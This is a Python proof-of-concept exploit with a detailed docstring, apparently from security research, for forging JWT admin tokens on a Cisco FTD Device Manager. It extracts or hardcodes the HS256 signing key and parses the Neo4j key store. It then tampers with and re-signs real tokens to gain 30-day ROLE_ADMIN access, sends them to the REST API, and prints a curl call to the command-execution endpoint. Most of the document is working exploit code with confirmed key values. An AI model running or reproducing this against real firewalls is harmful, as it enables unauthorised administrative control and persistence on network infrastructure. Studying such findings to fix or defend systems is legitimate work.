"""
F-FTD-106: FDM JWT token forgery via extracted HS256 signing key
STATUS: CONFIRMED 2026-08-24
CONTROLLED ENVIRONMENT ONLY

Root cause chain (F-FTD-97 → F-FTD-102 → F-FTD-106):
  FDM uses HMAC-SHA256 (HS256) for all JWT access tokens. The signing key is a
  static 16-byte value seeded from Neo4j at boot, cached in NGFWCache, and never rotated.
  An attacker with process memory access (admin + sudo) can extract the key via JVM heap scan,
  then forge tokens with tampered claims that FDM accepts.

  FDMJwtBuilder.getSecret() bytecode:
    invokestatic EncryptionUtil.getEncryptionKeyBytesFromCache():()[B
    areturn
  FDMJwtBuilder.generateJwsToken():
    invokevirtual getSecret():[B
    invokeinterface JwtBuilder.signWith(SignatureAlgorithm.HS256, secret)
  FDMJwtBuilder.parseAndValidateJwsToken():
    Jwts.parser().setSigningKey(getSecret()).require("tokenType","JWT_Access").parse(token)

  Neo4j stores an ENCRYPTED 32-byte blob (NOT the JWT key directly):
    Label: SerializationKey (Neo4j label token store confirmed)
    Property: "encryptedString" = base64(AES-encrypted blob, 32 bytes when decoded)
    File: /ngfw/var/lib/db/ngfw.db/neostore.propertystore.db.strings
    Record format: 128-byte dynamic records; flags 0x90 = inUse(0x10)|firstInChain(0x80)
    Neo4j raw value for FTD 7.0.0-94: BGFv6IoBiYQfePMHT8jO2ZHoBf7uuZbcvF2pQ45qxlg= (44B)
    Raw decoded: 04616fe88a0189841f78f3074fc8ced991e805feeeb996dcbc5da9438e6ac658 (32B)

  CRITICAL CORRECTION: JWT signing key is 16 bytes, NOT 32.
    EncryptionUtil.AES_KEY_SIZE = 128 (bits = 16 bytes). The Neo4j value is an
    AES-encrypted form. The actual 16-byte JWT key is derived via a transformation
    NOT reversible from the Neo4j value alone (AES key derivation details TBD).

  CONFIRMED JWT signing key (FTD 7.0.0-94, heap scan 2026-08-24):
    hex: 9c42f9fd11a9fcfc26b5bc5325fd51c5
    b64: nEL5/RGp/PwmtbxTJf1RxQ==
    Extraction: scan /proc/<tomcat_pid>/mem for LE int32 header b'\\x10\\x00\\x00\\x00'
    (Java byte[16] length field), test each candidate with HMAC-SHA256 oracle.
    10 copies found in 644MB heap — key is PERSISTENT (NGFWCache holds reference).
    See ftd_jwt_key_extraction.py for the confirmed extraction procedure.

  Server-side token store validation (CONFIRMED):
    FDM validates jti against a server-side registry on every request.
    Pure JWT forgery (invented jti) → HTTP 401 "revoked or obsolete".
    PAYLOAD TAMPERING (real jti + extracted key + modified claims) → HTTP 200 CONFIRMED.
    FDM trusts claims FROM the JWT; does NOT compare against stored token payload.

  Confirmed JWT header (live token inspection, FTD 7.0.0-94):
    {"alg":"HS256"}  — NO typ field (jjwt 0.7.0 default)
    b64url: eyJhbGciOiJIUzI1NiJ9

  Confirmed JWT payload claims (live token inspection):
    iat, sub, jti, nbf, exp, refreshTokenExpiresAt (ms), tokenType,
    userUuid, userRole, origin, username
    NOTE: NO iss, NO accessTokenExpiresAt, NO refreshCount in actual tokens.
    Earlier bytecode analysis (iss, accessTokenExpiresAt, refreshCount) was INCORRECT.

  NgfwAccessTokenAuthProvider.authenticate() flow:
    1. NgfwAccessTokenAuth → jwtBuilder.parseAndValidateJwsToken(token, false, null)
    2. Validated → setAuthenticated(true).setParsedToken(fdmJwsToken)
    3. NgfwRBACAccessVoter.vote() — userRole must match Neo4j UserRole node

Attack chain (CONFIRMED):
  1. admin+sudo → read /proc/<tomcat_pid>/mem
  2. HMAC oracle heap scan → key 9c42f9fd11a9fcfc26b5bc5325fd51c5
  3. Login once to get real jti
  4. Tamper payload (exp+30d, any claims) + re-sign → HTTP 200

Confirmed HTTP 200 endpoints (forged token, 2026-08-24):
  /api/fdm/v6/object/networks, /api/fdm/v6/devices/default/interfaces,
  /api/fdm/v6/devices/default/routing/virtualrouters, /api/fdm/v6/policy/accesspolicies,
  /api/fdm/v6/object/securityzones

Impact:
  - Token lifetime extension (default 30 min → forge 30-day tokens)
  - Claim tampering: exp, userRole, userUuid modifiable
  - Session persistence despite revocation
  - Full FDM REST API access: policy r/w, config export, interface/routing/VPN data
  - Lateral: FTD managing ASA → ASA pivot

References:
  FDMJwtBuilder.class: core-security.jar — getSecret() → EncryptionUtil.getEncryptionKeyBytesFromCache
  EncryptionKeyBootstrap.class: framework.jar — Neo4j SerializationKey load at boot
  SerializationKey.class: framework.jar — UUID 6adc7474-37f8-482b-a9d2-8e0e34d1628a
  Neo4j label token names (confirmed): SerializationKey, EncryptedString
  Property key names (confirmed): encryptedString, uuid, isBootstrapSuccessFul
  Key extraction module: ftd_jwt_key_extraction.py (heap scan, confirmed 2026-08-24)
"""

# CONTROLLED ENVIRONMENT ONLY

import argparse
import base64
import sys
import time
import uuid
from typing import Optional

FINDING = "F-FTD-106"
LABEL = "FDM JWT token forgery via extracted HS256 signing key"

SERIALIZATION_KEY_UUID = "6adc7474-37f8-482b-a9d2-8e0e34d1628a"
# Confirmed admin UUID for FTD 7.0.0-94 (from live token inspection 2026-08-24)
ADMIN_USER_UUID = "bd1f4b5f-9c2a-11f1-9b57-4744106b6c8e"
NEO4J_STRINGS_FILE = "/ngfw/var/lib/db/ngfw.db/neostore.propertystore.db.strings"

# Confirmed 16-byte JWT signing key for FTD 7.0.0-94 (heap scan 2026-08-24)
# NOT the 32-byte Neo4j value — see docstring for derivation details
CONFIRMED_KEY_HEX = "9c42f9fd11a9fcfc26b5bc5325fd51c5"
CONFIRMED_KEY_B64 = "nEL5/RGp/PwmtbxTJf1RxQ=="

DEFAULT_TOKEN_LIFETIME = 86400 * 30  # 30 days (tamper exploit: extend default 30-min TTL)
ROLE_ADMIN_UUID = "00000011-0000-0000-0000-000000000011"
ROLE_READ_WRITE_UUID = "00000011-0000-0000-0000-000000000012"
ROLE_READ_ONLY_UUID = "00000011-0000-0000-0000-000000000013"
DEFAULT_ROLE = "ROLE_ADMIN"
DEFAULT_USERNAME = "admin"
DEFAULT_HOST = "127.0.0.1"
DEFAULT_PORT = 443


def extract_hmac_key_from_neo4j(strings_file: str) -> Optional[bytes]:
    """
    Extract the AES-encrypted SerializationKey blob from Neo4j property store strings file.

    NOTE: This extracts the 32-byte ENCRYPTED value from Neo4j. This is NOT the JWT
    signing key. The actual 16-byte JWT key requires further derivation (heap scan
    via ftd_jwt_key_extraction.py is the confirmed method).

    This function is useful for static analysis — it confirms which Neo4j node
    seeds the key derivation.

    Neo4j dynamic record format (128 bytes/record, 8-byte header):
      [0]   flags: 0x10=inUse, 0x80=firstInChain (both = 0x90)
      [1-3] data length (big-endian 3 bytes)
      [4-7] nextRecord (big-endian uint32; 0xFFFFFFFF = none)
      [8+]  UTF-8 data

    Target: firstInChain records with length=44 that base64-decode to 32 bytes.
    FTD 7.0.0-94 SerializationKey is at dynamic record 15123.
    Property: SerializationKey.encryptedString = BGFv6IoBiYQfePMHT8jO2ZHoBf7uuZbcvF2pQ45qxlg=
    """
    import struct
    RECORD_SIZE = 128
    HEADER_SIZE = 8
    FLAG_IN_USE = 0x10
    FLAG_FIRST_IN_CHAIN = 0x80

    try:
        with open(strings_file, 'rb') as f:
            data = f.read()
    except (PermissionError, FileNotFoundError) as e:
        print(f"[-] Cannot read {strings_file}: {e}")
        return None

    n_records = len(data) // RECORD_SIZE
    print(f"[*] Scanning {n_records} dynamic records in {strings_file}")

    candidates = []
    for i in range(n_records):
        rec = data[i * RECORD_SIZE:(i + 1) * RECORD_SIZE]
        if len(rec) < HEADER_SIZE:
            continue
        flags = rec[0]
        if not (flags & FLAG_IN_USE) or not (flags & FLAG_FIRST_IN_CHAIN):
            continue
        length = struct.unpack('>I', b'\x00' + rec[1:4])[0]
        if length != 44:
            continue
        raw_str = rec[HEADER_SIZE:HEADER_SIZE + length]
        try:
            b64_str = raw_str.decode('ascii')
            key_bytes = base64.b64decode(b64_str)
        except Exception:
            continue
        if len(key_bytes) == 32:
            candidates.append((i, b64_str, key_bytes))

    if not candidates:
        print("[-] No 32-byte firstInChain key records found")
        return None

    if len(candidates) == 1:
        idx, b64_str, key_bytes = candidates[0]
        print(f"[+] HMAC key extracted from record {idx}: {b64_str}")
        return key_bytes

    print(f"[*] {len(candidates)} candidate records found — returning first (record {candidates[0][0]})")
    for idx, b64_str, _ in candidates:
        print(f"    record {idx}: {b64_str}")
    return candidates[0][2]


# Backward-compat alias
extract_aes_key_from_neo4j = extract_hmac_key_from_neo4j


def forge_fdm_jwt(key_bytes: bytes,
                  username: str = DEFAULT_USERNAME,
                  user_uuid: str = ADMIN_USER_UUID,
                  user_role: str = DEFAULT_ROLE,
                  lifetime: int = DEFAULT_TOKEN_LIFETIME,
                  origin: str = "password",
                  token_type: str = "JWT_Access",
                  jti_override: str = None) -> str:
    """
    Forge an FDM JWT access token signed with HS256.

    CONFIRMED claim structure (live token inspection, FTD 7.0.0-94, 2026-08-24):
      Header: {"alg":"HS256"}  — NO typ field (jjwt 0.7.0 default)
      Claims: iat, sub, jti, nbf, exp, refreshTokenExpiresAt (ms),
              tokenType, userUuid, userRole, origin, username
      NOTE: NO iss, NO accessTokenExpiresAt, NO refreshCount in actual FDM tokens.

    IMPORTANT: FDM validates jti against a server-side token store.
    Pure forgery (invented jti) → HTTP 401.
    Use tamper_and_resign() for the confirmed working exploit path.
    """
    import hmac as _hmac, hashlib as _hashlib, json as _json

    now = int(time.time())
    exp = now + lifetime
    jti_val = jti_override or str(uuid.uuid4())

    # Header: eyJhbGciOiJIUzI1NiJ9 — NO typ (confirmed from live tokens)
    header_b64 = b'eyJhbGciOiJIUzI1NiJ9'

    payload_dict = {
        "iat":                   now,
        "sub":                   username,
        "jti":                   jti_val,
        "nbf":                   now,
        "exp":                   exp,
        "refreshTokenExpiresAt": exp * 1000,
        "tokenType":             token_type,
        "userUuid":              user_uuid,
        "userRole":              user_role,
        "origin":                origin,
        "username":              username,
    }
    payload_b64 = base64.urlsafe_b64encode(
        _json.dumps(payload_dict, separators=(',', ':')).encode()
    ).rstrip(b'=')

    signing_input = header_b64 + b'.' + payload_b64
    sig = base64.urlsafe_b64encode(
        _hmac.new(key_bytes, signing_input, _hashlib.sha256).digest()
    ).rstrip(b'=')
    return (signing_input + b'.' + sig).decode()


def tamper_and_resign(real_token: str, key_bytes: bytes, **overrides) -> str:
    """
    CONFIRMED ATTACK PATH (2026-08-24): take a real FDM JWT (valid jti from login),
    modify its payload claims, re-sign with extracted key.

    FDM accepts the tampered token because:
      1. jti is valid → server-side store check passes
      2. signature is valid → HMAC check passes
      3. FDM reads claims FROM the JWT, not from the stored token → payload trusted

    Example: tamper_and_resign(real_token, key, exp=int(time.time())+86400*30)
    Returns re-signed JWT string with modified claims.
    """
    import hmac as _hmac, hashlib as _hashlib, json as _json

    parts = real_token.split('.')
    pad = (4 - len(parts[1]) % 4) % 4
    payload_dict = _json.loads(base64.urlsafe_b64decode(parts[1] + '=' * pad))
    payload_dict.update(overrides)

    header_b64 = b'eyJhbGciOiJIUzI1NiJ9'
    payload_b64 = base64.urlsafe_b64encode(
        _json.dumps(payload_dict, separators=(',', ':')).encode()
    ).rstrip(b'=')
    signing_input = header_b64 + b'.' + payload_b64
    sig = base64.urlsafe_b64encode(
        _hmac.new(key_bytes, signing_input, _hashlib.sha256).digest()
    ).rstrip(b'=')
    return (signing_input + b'.' + sig).decode()


def test_forged_token(token: str, host: str, port: int, endpoint: str = "/api/fdm/v6/identity/users",
                      verify_ssl: bool = False) -> dict:
    """Test forged token against target FDM REST API."""
    try:
        import urllib.request
        import ssl
        import json
    except ImportError:
        pass

    url = f"https://{host}:{port}{endpoint}"
    headers = {
        "Authorization": f"Bearer {token}",
        "Accept": "application/json",
        "Content-Type": "application/json",
    }

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    req = urllib.request.Request(url, headers=headers, method="GET")
    try:
        with urllib.request.urlopen(req, context=ctx, timeout=10) as resp:
            body = resp.read().decode("utf-8", errors="replace")
            status = resp.status
            return {"status": status, "body": body[:500], "success": status == 200}
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace")
        return {"status": e.code, "body": body[:200], "success": False}
    except Exception as e:
        return {"status": None, "body": str(e), "success": False}


def main() -> None:
    ap = argparse.ArgumentParser(description=f"{FINDING}: {LABEL}")
    ap.add_argument("--key", default=None,
                    help=f"16-byte HMAC signing key as hex or base64. FTD 7.0.0-94 confirmed: {CONFIRMED_KEY_HEX}")
    ap.add_argument("--key-file", default=None,
                    help="Path to Neo4j strings file (extracts encrypted blob for static analysis; NOT the JWT key)")
    ap.add_argument("--username", default=DEFAULT_USERNAME,
                    help=f"FDM username for token (default: {DEFAULT_USERNAME})")
    ap.add_argument("--user-uuid", default=ADMIN_USER_UUID,
                    help=f"FDM user UUID (default: known admin UUID from Neo4j)")
    ap.add_argument("--user-role", default=DEFAULT_ROLE,
                    help=f"FDM userRole claim — must match Neo4j UserRole.name (default: {DEFAULT_ROLE})")
    ap.add_argument("--lifetime", type=int, default=DEFAULT_TOKEN_LIFETIME,
                    help=f"Token lifetime in seconds (default: {DEFAULT_TOKEN_LIFETIME})")
    ap.add_argument("--host", default=DEFAULT_HOST,
                    help=f"Target FDM HTTPS host (default: {DEFAULT_HOST})")
    ap.add_argument("--port", type=int, default=DEFAULT_PORT,
                    help=f"Target HTTPS port (default: {DEFAULT_PORT})")
    ap.add_argument("--endpoint", default="/api/fdm/v6/object/networks",
                    help="FDM API endpoint to test (default: /api/fdm/v6/object/networks — confirmed 200)")
    ap.add_argument("--print-only", action="store_true",
                    help="Only print the forged token, do not send HTTP request")
    ap.add_argument("--no-verify", action="store_true", default=True,
                    help="Skip TLS certificate verification (always on for FTD self-signed)")
    args = ap.parse_args()

    print(f"[*] {FINDING}: {LABEL}")
    print("[!] CONTROLLED ENVIRONMENT ONLY")
    print("[!] Forged JWT provides authenticated FDM admin access from any network location")
    print()

    # Step 1: Get key
    key_bytes = None
    if args.key:
        try:
            # Accept hex or base64
            raw = args.key.strip()
            if len(raw) == 32 and all(c in '0123456789abcdefABCDEF' for c in raw):
                key_bytes = bytes.fromhex(raw)
            else:
                key_bytes = base64.b64decode(raw + '=' * ((4 - len(raw) % 4) % 4))
        except Exception as e:
            print(f"[-] Invalid key: {e}")
            sys.exit(1)
        if len(key_bytes) != 16:
            print(f"[-] Key must be 16 bytes (got {len(key_bytes)}) — JWT signing key is AES-128 (16B)")
            print(f"    Neo4j value decodes to 32B but that is the ENCRYPTED blob, not the JWT key")
            sys.exit(1)
        print(f"[+] Using provided key ({len(key_bytes)} bytes)")
    elif args.key_file:
        print(f"[1] Extracting HMAC key from Neo4j strings file: {args.key_file}")
        key_bytes = extract_hmac_key_from_neo4j(args.key_file)
    else:
        print(f"[1] Attempting to extract HMAC key from live VM Neo4j strings file...")
        key_bytes = extract_hmac_key_from_neo4j(NEO4J_STRINGS_FILE)

    if not key_bytes:
        print(f"[-] No key. Provide --key <hex_or_b64> or run ftd_jwt_key_extraction.py first")
        print(f"    FTD 7.0.0-94 confirmed key (hex): {CONFIRMED_KEY_HEX}")
        print(f"    FTD 7.0.0-94 confirmed key (b64): {CONFIRMED_KEY_B64}")
        sys.exit(1)

    # Step 2: Forge JWT
    key_hex = key_bytes.hex()
    print(f"\n[2] Forging JWT access token...")
    print(f"    key:      {base64.b64encode(key_bytes).decode()} ({len(key_bytes)}B / {len(key_bytes)*8}bit)")
    print(f"    key_hex:  {key_hex[:16]}...{key_hex[-8:]}")
    print(f"    username: {args.username}")
    print(f"    userRole: {args.user_role}  (must match Neo4j UserRole node)")
    print(f"    userUuid: {args.user_uuid}")
    print(f"    lifetime: {args.lifetime}s")
    print(f"    algorithm: HS256")

    token = forge_fdm_jwt(
        key_bytes=key_bytes,
        username=args.username,
        user_uuid=args.user_uuid,
        user_role=args.user_role,
        lifetime=args.lifetime,
    )

    print(f"\n[+] FORGED TOKEN:")
    print(f"    {token}")
    print()
    print(f"    Authorization: Bearer {token}")

    if args.print_only:
        return

    # Step 3: Test token
    print(f"\n[3] Testing forged token against {args.host}:{args.port}{args.endpoint}...")
    result = test_forged_token(token, args.host, args.port, args.endpoint)

    print(f"    HTTP {result['status']}: {'SUCCESS' if result['success'] else 'FAILED'}")
    if result["body"]:
        print(f"    Response: {result['body'][:200]}")

    if result["success"]:
        print()
        print(f"[!] FINDING CONFIRMED: Forged JWT accepted — authenticated API access achieved")
        print(f"    userRole '{args.user_role}' is valid — exists as Neo4j UserRole node")
        print(f"    Full FDM REST API accessible from network with forged token")
        print()
        print(f"    Command execution via forged token:")
        print(f'      curl -sk -H "Authorization: Bearer {token[:30]}..." \\')
        print(f'           -H "Content-Type: application/json" \\')
        print(f'           -d \'{{"commandInput":"show version","timeOut":30}}\' \\')
        print(f'           https://{args.host}:{args.port}/api/fdm/v6/action/command')
    elif result["status"] == 401:
        print()
        print(f"[-] 401 — token rejected. Possible causes:")
        print(f"    1. Wrong userRole ('{args.user_role}' doesn't match Neo4j UserRole node)")
        print(f"       Try: ADMIN, READ_ONLY, ANALYST, Administrator — or extract from /identity/users via AJP")
        print(f"    2. Wrong HMAC key (key regenerated since Neo4j snapshot)")
        print(f"    3. Token claims mismatch — inspect with: python3 -c \"import jwt; print(jwt.decode('{token[:20]}...', options={{'verify_signature':False}}))\"")
    elif result["status"] == 403:
        print()
        print(f"[-] 403 — token valid but access denied to endpoint {args.endpoint}")
        print(f"    Role '{args.user_role}' may be READ_ONLY — try ADMIN or higher role")
        print(f"    Or: try a different endpoint that the role can access")


if __name__ == "__main__":
    main()
